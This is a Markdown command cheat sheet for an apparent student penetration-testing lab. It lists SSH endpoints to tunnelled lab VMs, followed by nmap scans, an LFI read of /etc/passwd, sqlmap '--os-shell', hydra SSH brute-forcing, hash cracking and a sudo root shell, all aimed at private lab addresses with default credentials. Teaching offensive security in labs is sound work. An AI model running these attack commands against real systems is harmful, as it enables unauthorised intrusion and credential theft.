# VIRTUAL MACHINES SSH COMMANDS
```
ssh ubuntu@ozone-hang-harold-fleet.trycloudflare.com
ssh ubuntu@compile-postcard-lodge-computed.trycloudflare.com
ssh ubuntu@higher-walnut-item-received.trycloudflare.com
ssh ubuntu@trailer-specializing-travesti-cam.trycloudflare.com
ssh ubuntu@drop-stay-defines-cal.trycloudflare.com
ssh ubuntu@diana-really-saving-jun.trycloudflare.com
ssh ubuntu@referral-create-offices-growth.trycloudflare.com
ssh ubuntu@dan-subaru-awareness-starsmerchant.trycloudflare.com
ssh ubuntu@isp-helicopter-assistance-pond.trycloudflare.com
ssh ubuntu@this-felt-downloading-carries.trycloudflare.com
ssh ubuntu@oakland-diversity-fcc-bag.trycloudflare.com
ssh ubuntu@database-sheep-collector-trance.trycloudflare.com
ssh ubuntu@zope-jennifer-executive-slow.trycloudflare.com
ssh ubuntu@discounts-fridge-assignment-him.trycloudflare.com
ssh ubuntu@fuzzy-locations-backup-cycles.trycloudflare.com
ssh ubuntu@rosa-medical-toronto-cayman.trycloudflare.com
ssh ubuntu@postage-safer-firewall-bizarre.trycloudflare.com
ssh ubuntu@device-suits-effects-screenshots.trycloudflare.com
ssh ubuntu@metropolitan-picks-isle-opponent.trycloudflare.com
ssh ubuntu@provinces-updates-valentine-angel.trycloudflare.com
```

# RECONNAISSANCE - FIND YOUR NETWORK
```
ifconfig # Show network interfaces
ip a # Display IP addresses
ip a | grep -E 'inet ' | grep -v 127.0.0.1 # Show your local IP
```

# NMAP PORT SCANNING
```
nmap -sn 10.163.217.0/24 # Ping scan - find all live hosts on network
nmap -F 10.163.217.123 # Quick scan - top 1000 ports
nmap -sV -F 10.163.217.123 # Service scan - detect versions on top ports
nmap -sV -p21,22,23,80,443,3306,5432,139,445 10.163.217.123 # Scan specific common ports
nmap -p- 10.163.217.123 # Full port scan - all 65535 ports
nmap -A 10.163.217.123 # Aggressive scan - OS, versions, scripts
nmap --open 10.163.217.123 # Show only open ports
nmap -sU -p 53,68,123,161 10.163.217.123 # UDP scan - common UDP ports
nmap -sC -sV 10.163.217.123 # Default scripts with version detection
nmap -sV -p- 10.163.217.123 -oN scan.txt # Full scan - save results to file
```

# SERVICE ENUMERATION
```
ftp 10.163.217.123 # Connect to FTP (anonymous access)
telnet 10.163.217.123 # Connect via Telnet (student:password123)
curl http://10.163.217.123/lfi.php?file=/etc/passwd # LFI vulnerability test
mysql -h 10.163.217.123 -u root -ppassword # Connect to MySQL (root:password)
psql -h 10.163.217.123 -U postgres -d bank # Connect to PostgreSQL (postgres:postgres)
smbclient //10.163.217.123/share -N # Connect to SMB share (guest access)
```

# VULNERABILITY SCANNING
```
nikto -h http://10.163.217.123 # Web vulnerability scanner
sqlmap -u "http://10.163.217.123/cmd.php?cmd=id" --os-shell # SQL injection to get shell
gobuster dir -u http://10.163.217.123 -w /usr/share/wordlists/dirb/common.txt # Directory brute force
hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://10.163.217.123 # SSH password brute force
john hashes.txt # Crack password hashes
```

# PRIVILEGE ESCALATION
```
sudo -l # Check sudo permissions
find / -perm -4000 2>/dev/null # Find SUID binaries
sudo /bin/bash # Get root shell via sudo misconfiguration
```

# LATERAL MOVEMENT
```
ssh student@10.163.217.122 # SSH to another VM
scp file.txt student@10.163.217.122:/home/student/ # Copy file to another VM
```